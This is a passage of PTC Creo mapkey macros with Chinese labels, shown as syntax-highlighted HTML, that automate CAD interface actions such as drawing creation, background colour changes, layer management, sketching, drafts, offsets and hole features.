`ProCmdModelNew` <span class="hljs-comment">;~ Select `new` `Type` 1 `Drawing`;\</span><br>mapkey(continued) ~ Input `new` `InputPanel1` `ELBOW_GEARBOX_TOPCOVER`;\<br>mapkey(continued) ~ Update `new` `InputPanel1` `ELBOW_GEARBOX_TOPCOVER`;~ Activate `new` `OK`;\<br>mapkey(continued) ~ Select `dwg_create` `rad_format` <span class="hljs-number">1</span> `2`;\<br>mapkey(continued) ~ Open `dwg_create` `opt_format_name`;~ Close `dwg_create` `opt_format_name`;<br>mapkey half @MAPKEY_LABEL工程图剖面加密<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Timer `UI Desktop` `UI Desktop` `popupMenuRMBTimerCB`;\<br>mapkey(continued) ~ Close `rmb_popup` `PopupMenu`;\<br>mapkey(continued) ~ Command `ProCmdDwgRenameXsec@PopupMenuGraphicWinStack` <span class="hljs-comment">;;\</span><br>mapkey(continued) ~ Timer `UI Desktop` `UI Desktop` `popupMenuRMBTimerCB`;\<br>mapkey(continued) ~ Close `rmb_popup` `PopupMenu`;#SPACING<span class="hljs-comment">;#HALF;#HALF;</span><br>mapkey gen @MAPKEY_LABEL定向M视图出图<span class="hljs-comment">;~ Command `ProCmdDwgViewGen` ;\</span><br>mapkey(continued) @PAUSE_FOR_SCREEN_PICK<span class="hljs-comment">;~ Select `drawing_view` `view_names_list` 1 `M`;\</span><br>mapkey(continued) ~ Activate `drawing_view` `view_names_list` <span class="hljs-number">1</span> `M`;\<br>mapkey(continued) ~ Activate `drawing_view` `psh_apply`;~ Activate `drawing_view` `psh_close`;<br>mapkey rez @MAPKEY_LABEL染色为紫红<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `page_Render_control_btn` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br><span class="hljs-title">mapkey(continued) ~ Select `main_dlg_cur` `Render:</span>ProCmdViewGallery`;\<br>mapkey(continued) ~ Select `main_dlg_cur` \<br>mapkey(continued) `ProCmdViewGallery_layoutph.palette_holder.myAppPalette.NamesList` <span class="hljs-number">1</span> \<br>mapkey(continued) `&lt;ptc-metallic-aluminium&gt; - <span class="hljs-number">3</span>`;\<br>mapkey(continued) ~ Timer `UI Desktop` `UI Desktop` `Gallery_UI_Timer`;\<br><span class="hljs-title">mapkey(continued) ~ Close `main_dlg_cur` `Render:</span>ProCmdViewGallery`;<br>mapkey baw @MAPKEY_LABEL换白色背景<span class="hljs-comment">;~ Select `main_dlg_cur` `appl_casc`;\</span><br>mapkey(continued) ~ Close `main_dlg_cur` `appl_casc`;~ Command `ProCmdRibbonOptionsDlg` <span class="hljs-comment">;\</span><br>mapkey(continued) ~ Select `ribbon_options_dialog` `PageSwitcherPageList` <span class="hljs-number">1</span> `ConfigLayout`;\<br>mapkey(continued) ~ Select `ribbon_options_dialog` `PageSwitcherPageList` <span class="hljs-number">1</span> `colors_layouts`;\<br>mapkey(continued) ~ Select `ribbon_options_dialog` `PageSwitcherPageList` <span class="hljs-number">1</span> `colors_layouts`;\<br>mapkey(continued) ~ Open `ribbon_options_dialog` `colors_layouts.Color_scheme_optMenu`;\<br>mapkey(continued) ~ Close `ribbon_options_dialog` `colors_layouts.Color_scheme_optMenu`;\<br>mapkey(continued) ~ Select `ribbon_options_dialog` `colors_layouts.Color_scheme_optMenu` <span class="hljs-number">1</span> `2`;\<br>mapkey(continued) ~ Activate `ribbon_options_dialog` `OkPshBtn`;<br>mapkey bac @MAPKEY_LABEL换自定义背景<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trail `UI Desktop` `UI Desktop` `PREVIEW_POPUP_TIMER` \<br><span class="hljs-title">mapkey(continued) `main_dlg_w12:PHTLeft.AssyTree:</span>&lt;NULL&gt;`;~ Select `main_dlg_cur` `appl_casc`;\<br>mapkey(continued) ~ Close `main_dlg_cur` `appl_casc`;~ Command `ProCmdRibbonOptionsDlg` <span class="hljs-comment">;\</span><br>mapkey(continued) ~ Select `ribbon_options_dialog` `PageSwitcherPageList` <span class="hljs-number">1</span> `DisplayLayout`;\<br>mapkey(continued) ~ Select `ribbon_options_dialog` `PageSwitcherPageList` <span class="hljs-number">1</span> `colors_layouts`;\<br>mapkey(continued) ~ Select `ribbon_options_dialog` `PageSwitcherPageList` <span class="hljs-number">1</span> `colors_layouts`;\<br>mapkey(continued) ~ Open `ribbon_options_dialog` `colors_layouts.Color_scheme_optMenu`;\<br>mapkey(continued) ~ Close `ribbon_options_dialog` `colors_layouts.Color_scheme_optMenu`;\<br>mapkey(continued) ~ Select `ribbon_options_dialog` `colors_layouts.Color_scheme_optMenu` <span class="hljs-number">1</span> \<br>mapkey(continued) `Custom`;\<br>mapkey(continued) ~ Activate `ribbon_options_dialog` `colors_layouts.system_colors_file_open`;\<br>mapkey(continued) ~ Trail `UI Desktop` `UI Desktop` `DLG_PREVIEW_POST` `file_open`;\<br>mapkey(continued) ~ Activate `file_open` `computer_pb`;\<br><span class="hljs-title">mapkey(continued) ~ Select `file_open` `Ph_list.Filelist` 1 `d:</span>`;\<br><span class="hljs-title">mapkey(continued) ~ Activate `file_open` `Ph_list.Filelist` 1 `d:</span>`;\<br>mapkey(continued) ~ Select `file_open` `Ph_list.Filelist` <span class="hljs-number">1</span> `Users`;\<br>mapkey(continued) ~ Activate `file_open` `Ph_list.Filelist` <span class="hljs-number">1</span> `Users`;\<br>mapkey(continued) ~ Trail `UI Desktop` `UI Desktop` `PREVIEW_POPUP_TIMER` \<br><span class="hljs-title">mapkey(continued) `file_open:Ph_list.Filelist:</span>&lt;NULL&gt;`;\<br>mapkey(continued) ~ Select `file_open` `Ph_list.Filelist` <span class="hljs-number">1</span> `gsmeng`;\<br>mapkey(continued) ~ Activate `file_open` `Ph_list.Filelist` <span class="hljs-number">1</span> `gsmeng`;\<br>mapkey(continued) ~ Select `file_open` `Ph_list.Filelist` <span class="hljs-number">1</span> `temp-<span class="hljs-number">3</span>`;\<br>mapkey(continued) ~ Activate `file_open` `Ph_list.Filelist` <span class="hljs-number">1</span> `temp-<span class="hljs-number">3</span>`;\<br>mapkey(continued) ~ Select `file_open` `Ph_list.Filelist` <span class="hljs-number">1</span> `syscol.scl`;\<br>mapkey(continued) ~ Activate `file_open` `Ph_list.Filelist` <span class="hljs-number">1</span> `syscol.scl`;\<br>mapkey(continued) ~ Activate `ribbon_options_dialog` `OkPshBtn`;<br>mapkey axi @MAPKEY_LABEL插入基准轴<span class="hljs-comment">;~ Command `ProCmdDatumAxis` ;\</span><br>mapkey(continued) @PAUSE_FOR_SCREEN_PICK<span class="hljs-comment">;~ Activate `Odui_Dlg_00` `stdbtn_1`;</span><br>mapkey caap @MAPKEY_LABEL清除整体外观颜色<span class="hljs-comment">;\</span><br><span class="hljs-title">mapkey(continued) ~ Select `main_dlg_cur` `Render:</span>ProCmdViewGallery`;\<br>mapkey(continued) ~ Activate `main_dlg_cur` \<br>mapkey(continued) `ProCmdViewGallery_layoutph.palette_holder.clearAppearance`;\<br><span class="hljs-title">mapkey(continued) ~ Close `main_dlg_cur` `Render:</span>ProCmdViewGallery`;\<br>mapkey(continued) ~ Activate `GET SELECT` `quit_sel`;\<br><span class="hljs-title">mapkey(continued) ~ Select `main_dlg_cur` `Render:</span>ProCmdViewGallery`;\<br>mapkey(continued) ~ Select `main_dlg_cur` \<br>mapkey(continued) `ProCmdViewGallery_layoutph.palette_holder.clearAppearance`;\<br>mapkey(continued) ~ Close `main_dlg_cur` \<br>mapkey(continued) `ProCmdViewGallery_layoutph.palette_holder.clearAppearance`;\<br>mapkey(continued) ~ Activate `main_dlg_cur` `clearAllAppearance`;\<br>mapkey(continued) ~ FocusIn `UI Message Dialog` `yes`;~ Activate `UI Message Dialog` `yes`;<br>mapkey cap @MAPKEY_LABEL清除部分外观颜色<span class="hljs-comment">;\</span><br><span class="hljs-title">mapkey(continued) ~ Select `main_dlg_cur` `Render:</span>ProCmdViewGallery`;\<br>mapkey(continued) ~ Select `main_dlg_cur` \<br>mapkey(continued) `ProCmdViewGallery_layoutph.palette_holder.clearAppearance`;\<br>mapkey(continued) ~ Close `main_dlg_cur` \<br>mapkey(continued) `ProCmdViewGallery_layoutph.palette_holder.clearAppearance`;\<br>mapkey(continued) ~ Activate `main_dlg_cur` `clearOneAppearance`;\<br><span class="hljs-title">mapkey(continued) ~ Close `main_dlg_cur` `Render:</span>ProCmdViewGallery`;<br>mapkey asm @MAPKEY_LABEL打开装配体<span class="hljs-comment">;~ Command `ProCmdModelOpen` ;\</span><br>mapkey(continued) ~ Trail `UI Desktop` `UI Desktop` `DLG_PREVIEW_POST` `file_open`;\<br>mapkey(continued) ~ Open `file_open` `Type`;~ Close `file_open` `Type`;\<br>mapkey(continued) ~ Select `file_open` `Type` <span class="hljs-number">1</span> `db_37`;~ Activate `file_open` `Current Dir`;\<br>mapkey(continued) ~ Open `file_open` `Type`;~ Close `file_open` `Type`;\<br>mapkey(continued) ~ Select `file_open` `Type` <span class="hljs-number">1</span> `db_1`;<br>mapkey dsuf @MAPKEY_LABEL隐藏工程图下的曲面<span class="hljs-comment">;~ Command `ProCmdMdlTreeShowLyrs` ;\</span><br>mapkey(continued) ~ Trail `UI Desktop` `UI Desktop` `PREVIEW_POPUP_TIMER` \<br><span class="hljs-title">mapkey(continued) `main_dlg_w2:PHTLeft.AssyTree:</span>&lt;NULL&gt;`;\<br>mapkey(continued) ~ RButtonArm `main_dlg_cur` `LayersAssyTree` `node0`;\<br>mapkey(continued) ~ Command `ProCmdLayer_NewLay` <span class="hljs-comment">;~ FocusOut `newlayerprops` `LayerNameInput`;\</span><br>mapkey(continued) ~ Open `main_dlg_cur` `Sst_bar.filter_list`;\<br>mapkey(continued) ~ Close `main_dlg_cur` `Sst_bar.filter_list`;\<br>mapkey(continued) ~ Select `main_dlg_cur` `Sst_bar.filter_list` <span class="hljs-number">1</span> `17`;\<br>mapkey(continued) ~ Command `ProCmdSelFilterSet` <span class="hljs-number">11</span><span class="hljs-comment">;~ Activate `newlayerprops` `OkBtn`;\</span><br><span class="hljs-title">mapkey(continued) ~ RButtonArm `main_dlg_cur` `LayersAssyTree` `node0:LAY0001:</span>in \<br>mapkey(continued) RIGHTHAND_RIGHT_SMALLARM.DRW`;~ Command `ProCmdViewHide` <span class="hljs-comment">;\</span><br><span class="hljs-title">mapkey(continued) ~ Select `main_dlg_cur` `LayersAssyTree` 1 `node0:</span><span class="hljs-number">06</span>_ALL_SURFS`;\<br><span class="hljs-title">mapkey(continued) ~ RButtonArm `main_dlg_cur` `LayersAssyTree` `node0:</span><span class="hljs-number">06</span>_ALL_SURFS`;\<br>mapkey(continued) ~ Command `ProCmdViewHide` <span class="hljs-comment">;\</span><br><span class="hljs-title">mapkey(continued) ~ Select `main_dlg_cur` `LayersAssyTree` 1 `node0:</span><span class="hljs-number">03</span>_ALL_CURVES`;\<br><span class="hljs-title">mapkey(continued) ~ RButtonArm `main_dlg_cur` `LayersAssyTree` `node0:</span><span class="hljs-number">03</span>_ALL_CURVES`;\<br>mapkey(continued) ~ Command `ProCmdViewHide`;<br>mapkey digs @MAPKEY_LABEL打开igs图档<span class="hljs-comment">;~ Command `ProCmdModelOpen` ;\</span><br>mapkey(continued) ~ Trail `UI Desktop` `UI Desktop` `DLG_PREVIEW_POST` `file_open`;\<br>mapkey(continued) ~ Trail `UI Desktop` `UI Desktop` `PREVIEW_POPUP_TIMER` \<br><span class="hljs-title">mapkey(continued) `file_open:Ph_list.Filelist:</span>&lt;NULL&gt;`;~ Activate `file_open` `Current Dir`;\<br>mapkey(continued) ~ Open `file_open` `Type`;~ Close `file_open` `Type`;\<br>mapkey(continued) ~ Select `file_open` `Type` <span class="hljs-number">1</span> `filter_.igs,.iges,`;<br>mapkey skof @MAPKEY_LABEL草绘偏移<span class="hljs-comment">;~ Command `ProCmdSketOffset`  1;\</span><br>mapkey(continued) ~ Select `useedge` `EdgeType` <span class="hljs-number">1</span> `loop`;@PAUSE_FOR_SCREEN_PICK<span class="hljs-comment">;;\</span><br>mapkey(continued) ~ Select `useedge` `EdgeType` <span class="hljs-number">1</span> `single`;<br>mapkey pj @MAPKEY_LABEL投影曲线<span class="hljs-comment">;~ Command `ProCmdFtProject` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.projcrv_refs.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `projcrv_refs.<span class="hljs-number">1.0</span>` `PH.ChainTable` <span class="hljs-number">2</span> `DuMmY` `chains`;\<br>mapkey(continued) ~ Trigger `projcrv_refs.<span class="hljs-number">1.0</span>` `PH.ChainTable` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `projcrv_refs.<span class="hljs-number">1.0</span>` `PH.ChainTable` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ FocusOut `projcrv_refs.<span class="hljs-number">1.0</span>` `PH.ChainTable`;<br>mapkey arc @MAPKEY_LABEL三点画弧<span class="hljs-comment">;~ Command `ProCmdSket3Point`  1;</span><br>mapkey me @MAPKEY_LABEL合并曲面<span class="hljs-comment">;~ Command `ProCmdFtMerge` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `dashInst0.Done`;<br>mapkey ep @MAPKEY_LABEL曲面延伸<span class="hljs-comment">;~ Command `ProCmdFtExtendGr` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `dashInst0.Done`;<br>mapkey df @MAPKEY_LABEL零件拔模<span class="hljs-comment">;~ Command `ProCmdDraft` ;\</span><br>mapkey(continued) ~ Enter `main_dlg_cur` `dashInst0.Quit`;\<br>mapkey(continued) ~ <span class="hljs-keyword">Exit</span> `main_dlg_cur` `dashInst0.Quit`;\<br>mapkey(continued) ~ Trigger `main_dlg_cur` `maindashInst0.NeutsDashList` `0`;\<br>mapkey(continued) ~ Trigger `main_dlg_cur` `maindashInst0.NeutsDashList` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.draft_ref_page_2.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `draft_ref_page_2.<span class="hljs-number">1.0</span>` `PH.DraftTable` <span class="hljs-number">2</span> `0` `content`;\<br>mapkey(continued) ~ Trigger `draft_ref_page_2.<span class="hljs-number">1.0</span>` `PH.DraftTable` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `draft_ref_page_2.<span class="hljs-number">1.0</span>` `PH.DraftTable` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `draft_ref_page_2.<span class="hljs-number">1.0</span>` `PH.NeutTable` <span class="hljs-number">2</span> `0` `content`;\<br>mapkey(continued) ~ Trigger `draft_ref_page_2.<span class="hljs-number">1.0</span>` `PH.NeutTable` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `draft_ref_page_2.<span class="hljs-number">1.0</span>` `PH.NeutTable` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `draft_ref_page_2.<span class="hljs-number">1.0</span>` `PH.PullsRefList` `0`;\<br>mapkey(continued) ~ Trigger `draft_ref_page_2.<span class="hljs-number">1.0</span>` `PH.PullsRefList` ``<span class="hljs-comment">;</span><br>mapkey bz @MAPKEY_LABEL草图标注<span class="hljs-comment">;~ Command `ProCmdSketDimension`  1;</span><br>mapkey offd @MAPKEY_LABEL具有拔模的偏移<span class="hljs-comment">;~ Command `ProCmdFtOffset` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `maindashInst0.offtype_flyout_tb` `2 \<br>mapkey(continued) offtype_flyout`;~ Activate `main_dlg_cur` `2 offtype_flyout` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.references.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `references.<span class="hljs-number">1.0</span>` `PH.SrfCollTbl` <span class="hljs-number">2</span> `0` `Refs`;\<br>mapkey(continued) ~ Trigger `references.<span class="hljs-number">1.0</span>` `PH.SrfCollTbl` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `references.<span class="hljs-number">1.0</span>` `PH.SrfCollTbl` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `references.<span class="hljs-number">1.0</span>` `PH.sketch_list` `0`;\<br>mapkey(continued) ~ Trigger `references.<span class="hljs-number">1.0</span>` `PH.sketch_list` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ FocusOut `references.<span class="hljs-number">1.0</span>` `PH.SrfCollTbl`;\<br>mapkey(continued) ~ Activate `references.<span class="hljs-number">1.0</span>` `PH.sketch_btn`;<br>mapkey tan @MAPKEY_LABEL草绘相切<span class="hljs-comment">;~ Command `ProCmdSketTangentConstr`;</span><br>mapkey mg @MAPKEY_LABEL合并继承<span class="hljs-comment">;~ Command `ProCmdOduiDsfGenMerge` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `maindashInst0.Open_ref_model`;\<br>mapkey(continued) ~ Trail `UI Desktop` `UI Desktop` `DLG_PREVIEW_POST` `file_open`;\<br>mapkey(continued) ~ Activate `file_open` `Current Dir`;<br>mapkey work @MAPKEY_LABEL指定工作目录<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trail `UI Desktop` `UI Desktop` `PREVIEW_POPUP_TIMER` \<br><span class="hljs-title">mapkey(continued) `main_dlg_w2:PHTLeft.AssyTree:</span>&lt;NULL&gt;`;~ Close `main_dlg_cur` `appl_casc`;\<br>mapkey(continued) ~ Command `ProCmdSessionChangeDir` <span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trail `UI Desktop` `UI Desktop` `DLG_PREVIEW_POST` `file_open`;\<br>mapkey(continued) ~ Trail `UI Desktop` `UI Desktop` `PREVIEW_POPUP_TIMER` \<br><span class="hljs-title">mapkey(continued) `file_open:Ph_list.Filelist:</span>&lt;NULL&gt;`;\<br>mapkey(continued) ~ Move `file_open` `file_open` <span class="hljs-number">2</span> <span class="hljs-number">5.708990</span> <span class="hljs-number">8.303985</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `file_open` `Current Dir`;<br>mapkey cha @MAPKEY_LABEL倒角<span class="hljs-comment">;~ Command `ProCmdChamferEdge`;</span><br>mapkey offh @MAPKEY_LABEL偏移加厚<span class="hljs-comment">;~ Command `ProCmdFtOffset` ;\</span><br>mapkey(continued) ~ Enter `main_dlg_cur` `dashInst0.Quit`;\<br>mapkey(continued) ~ <span class="hljs-keyword">Exit</span> `main_dlg_cur` `dashInst0.Quit`;\<br>mapkey(continued) ~ Activate `main_dlg_cur` `maindashInst0.offtype_flyout_tb` `3 \<br>mapkey(continued) offtype_flyout`;~ Activate `main_dlg_cur` `3 offtype_flyout` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.references.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `references.<span class="hljs-number">2.0</span>` `PH.SrfCollTbl` <span class="hljs-number">2</span> `0` `Refs`;\<br>mapkey(continued) ~ Trigger `references.<span class="hljs-number">2.0</span>` `PH.SrfCollTbl` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `references.<span class="hljs-number">2.0</span>` `PH.SrfCollTbl` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ FocusOut `references.<span class="hljs-number">2.0</span>` `PH.SrfCollTbl`;\<br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.option.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>mapkey cy @MAPKEY_LABEL备份到工作目录<span class="hljs-comment">;~ Close `main_dlg_cur` `appl_casc`;\</span><br>mapkey(continued) ~ Command `ProCmdModelBackup` <span class="hljs-comment">;~ Activate `file_saveas` `Current Dir`;\</span><br>mapkey(continued) ~ Activate `file_saveas` `OK`;<br>mapkey bm @MAPKEY_LABEL拔模<span class="hljs-comment">;~ Command `ProCmdDraft` ;\</span><br>mapkey(continued) ~ Trigger `main_dlg_cur` `maindashInst0.PullsDashList` `0`;\<br>mapkey(continued) ~ Trigger `main_dlg_cur` `maindashInst0.PullsDashList` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.draft_ref_page_2.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `draft_ref_page_2.<span class="hljs-number">0.0</span>` `PH.DraftTable` <span class="hljs-number">2</span> `0` `content`;\<br>mapkey(continued) ~ Trigger `draft_ref_page_2.<span class="hljs-number">0.0</span>` `PH.DraftTable` <span class="hljs-number">2</span> `` ``<span class="hljs-comment">;</span><br>mapkey cfg @MAPKEY_LABELconfig配置<span class="hljs-comment">;~ Select `main_dlg_cur` `appl_casc`;\</span><br>mapkey(continued) ~ Close `main_dlg_cur` `appl_casc`;~ Command `ProCmdRibbonOptionsDlg` <span class="hljs-comment">;\</span><br>mapkey(continued) ~ Select `ribbon_options_dialog` `PageSwitcherPageList` <span class="hljs-number">1</span> `ConfigLayout`;<br>mapkey cr @MAPKEY_LABEL复制-选择性粘贴<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Select `main_dlg_cur` `PHTLeft.AssyTree` <span class="hljs-number">1</span> `node6`;\<br>mapkey(continued) ~ Command `ProCmdEditCopy` <span class="hljs-comment">;~ Command `ProCmdEditPasteSpecial` ;\</span><br>mapkey(continued) ~ Activate `paste_special` `applymoverotatePB` <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>mapkey cca @MAPKEY_LABEL删除现有图层<span class="hljs-comment">;~ Command `ProCmdMdlTreeShowLyrs` ;\</span><br>mapkey(continued) ~ Select `main_dlg_cur` `PHTLeft.PHLayerUI.AssyTree` <span class="hljs-number">1</span> \<br><span class="hljs-title">mapkey(continued) `node0:</span><span class="hljs-number">01</span>___PRT_ALL_DTM_PLN`;\<br>mapkey(continued) ~ Select `main_dlg_cur` `PHTLeft.PHLayerUI.AssyTree` <span class="hljs-number">8</span> \<br><span class="hljs-title">mapkey(continued) `node0:01___PRT_ALL_DTM_PLN` `node0:</span><span class="hljs-number">01</span>___PRT_DEF_DTM_PLN` \<br><span class="hljs-title">mapkey(continued) `node0:02___PRT_ALL_AXES` `node0:</span><span class="hljs-number">03</span>___PRT_ALL_CURVES` \<br><span class="hljs-title">mapkey(continued) `node0:04___PRT_ALL_DTM_PNT` `node0:</span><span class="hljs-number">05</span>___PRT_ALL_DTM_CSYS` \<br><span class="hljs-title">mapkey(continued) `node0:05___PRT_DEF_DTM_CSYS` `node0:</span><span class="hljs-number">06</span>___PRT_ALL_SURFS` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ RButtonArm `main_dlg_cur` `PHTLeft.PHLayerUI.AssyTree` \<br><span class="hljs-title">mapkey(continued) `node0:</span><span class="hljs-number">06</span>___PRT_ALL_SURFS`;~ Command `ProCmdLayer_DelLay` <span class="hljs-comment">;\</span><br>mapkey(continued) ~ FocusIn `UI Message Dialog` `yes`;~ Activate `UI Message Dialog` `yes`;<br>mapkey ccs @MAPKEY_LABEL新建实体图层<span class="hljs-comment">;\</span><br>mapkey(continued) ~ RButtonArm `main_dlg_cur` `PHTLeft.PHLayerUI.AssyTree` `node0`;\<br>mapkey(continued) ~ Command `ProCmdLayer_NewLay` <span class="hljs-comment">;~ Input `newlayerprops` `LayerNameInput` `s`;\</span><br>mapkey(continued) ~ Input `newlayerprops` `LayerNameInput` `so`;\<br>mapkey(continued) ~ Input `newlayerprops` `LayerNameInput` `sol`;\<br>mapkey(continued) ~ Input `newlayerprops` `LayerNameInput` `soli`;\<br>mapkey(continued) ~ Input `newlayerprops` `LayerNameInput` `solid`;\<br>mapkey(continued) ~ Update `newlayerprops` `LayerNameInput` `solid`;\<br>mapkey(continued) ~ Move `newlayerprops` `newlayerprops` <span class="hljs-number">2</span> <span class="hljs-number">25.882660</span> <span class="hljs-number">2.920469</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ FocusOut `newlayerprops` `LayerNameInput`;\<br>mapkey(continued) ~ Open `main_dlg_cur` `Sst_bar.filter_list`;\<br>mapkey(continued) ~ Close `main_dlg_cur` `Sst_bar.filter_list`;\<br>mapkey(continued) ~ Select `main_dlg_cur` `Sst_bar.filter_list` <span class="hljs-number">1</span> `19`;\<br>mapkey(continued) ~ Command `ProCmdSelFilterSet` <span class="hljs-number">19</span><span class="hljs-comment">;</span><br>mapkey ccu @MAPKEY_LABEL新建曲线层<span class="hljs-comment">;\</span><br><span class="hljs-title">mapkey(continued) ~ RButtonArm `main_dlg_cur` `PHTLeft.PHLayerUI.AssyTree` `node0:</span>SOLID`;\<br>mapkey(continued) ~ Command `ProCmdLayer_NewLay` <span class="hljs-comment">;~ Input `newlayerprops` `LayerNameInput` `c`;\</span><br>mapkey(continued) ~ Update `newlayerprops` `LayerNameInput` `c`;\<br>mapkey(continued) ~ FocusOut `newlayerprops` `LayerNameInput`;\<br>mapkey(continued) ~ Open `main_dlg_cur` `Sst_bar.filter_list`;\<br>mapkey(continued) ~ Close `main_dlg_cur` `Sst_bar.filter_list`;\<br>mapkey(continued) ~ Select `main_dlg_cur` `Sst_bar.filter_list` <span class="hljs-number">1</span> `4`;\<br>mapkey(continued) ~ Command `ProCmdSelFilterSet` <span class="hljs-number">13</span><span class="hljs-comment">;</span><br>mapkey fb @MAPKEY_LABEL发布几何<span class="hljs-comment">;~ Command `ProCmdOduiDsfPublishGeom` ;\</span><br>mapkey(continued) ~ Trigger `Odui_Dlg_00` `t1.SurfaceSetsList` `0`;\<br>mapkey(continued) ~ Trigger `Odui_Dlg_00` `t1.SurfaceSetsList` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Move `Odui_Dlg_00` `Odui_Dlg_00` <span class="hljs-number">2</span> <span class="hljs-number">22.743155</span> <span class="hljs-number">2.810952</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `Odui_Dlg_00` `t1.SurfaceSetsList` `0`;\<br>mapkey(continued) ~ Trigger `Odui_Dlg_00` `t1.SurfaceSetsList` ``<span class="hljs-comment">;</span><br>mapkey fill @MAPKEY_LABEL草绘圆角<span class="hljs-comment">;~ Command `ProCmdSketCirFilletWConstr`  1;\</span><br>mapkey(continued) @PAUSE_FOR_SCREEN_PICK<span class="hljs-comment">;@PAUSE_FOR_SCREEN_PICK;@PAUSE_FOR_SCREEN_PICK;\</span><br>mapkey(continued) @PAUSE_FOR_SCREEN_PICK<span class="hljs-comment">;</span><br>mapkey csu @MAPKEY_LABEL新建曲面层<span class="hljs-comment">;\</span><br>mapkey(continued) ~ RButtonArm `main_dlg_cur` `PHTLeft.PHLayerUI.AssyTree` `node0`;\<br>mapkey(continued) ~ Command `ProCmdLayer_NewLay` <span class="hljs-comment">;~ Input `newlayerprops` `LayerNameInput` `S`;\</span><br>mapkey(continued) ~ Update `newlayerprops` `LayerNameInput` `S`;\<br>mapkey(continued) ~ FocusOut `newlayerprops` `LayerNameInput`;\<br>mapkey(continued) ~ Open `main_dlg_cur` `Sst_bar.filter_list`;\<br>mapkey(continued) ~ Close `main_dlg_cur` `Sst_bar.filter_list`;\<br>mapkey(continued) ~ Select `main_dlg_cur` `Sst_bar.filter_list` <span class="hljs-number">1</span> `13`;\<br>mapkey(continued) ~ Command `ProCmdSelFilterSet` <span class="hljs-number">11</span><span class="hljs-comment">;</span><br>mapkey hob @MAPKEY_LABEL打标准螺丝孔<span class="hljs-comment">;~ Command `ProCmdHole` ;\</span><br>mapkey(continued) ~ Select `main_dlg_cur` `maindashInst0.ui_str_skt_std_type_rg` <span class="hljs-number">1</span> `Std`;\<br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.hole_fb_plcmnt_page.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>mapkey hot @MAPKEY_LABEL打普通孔<span class="hljs-comment">;~ Command `ProCmdHole` ;\</span><br>mapkey(continued) ~ Activate `main_dlg_cur` `chkbn.hole_fb_plcmnt_page.<span class="hljs-number">0</span>` <span class="hljs-number">1</span><span class="hljs-comment">;\</span><br>mapkey(continued) ~ Trigger `hole_fb_plcmnt_page.<span class="hljs-number">0.0</span>` `PH.ui_hole_prim_ref_cui_lst` `0`;\<br>mapkey(continued) ~ Trigger `hole_fb_plcmnt_page.<span class="hljs-number">0.0</span>` `PH.ui_hole_prim_ref_cui_lst` ``<span class="hljs-comment">;</span><br>mapkey line @MAPKEY_LABEL草绘直线<span class="hljs-comment">;~ Command `ProCmdSketLine`  1;</span><br>mapkey offt @MAPKEY_LABEL偏移替换<span class="hljs-comment">;~ Command `ProCmdFtOffset` ;\</span><br>mapkey(continued) ~ Enter `main_dlg_cur` `dashInst0.Quit`;\<br>mapkey(continued) ~ <span class="hljs-keyword">Exit</span> `main_dlg_cur` `dashInst0.Quit`;\<br>mapkey(continued) ~ Trigger `main_dlg_cur` `maindashInst0.ExclSrfColl` `0`;\<br>mapkey(continued) ~ Trigger `main_dlg_cur` `maindashInst0.ExclSrfColl` ``<span class="hljs-comment">;\</span><br>mapkey(continued) ~ Move `main_dlg_cur` `main_dlg_cur` <span 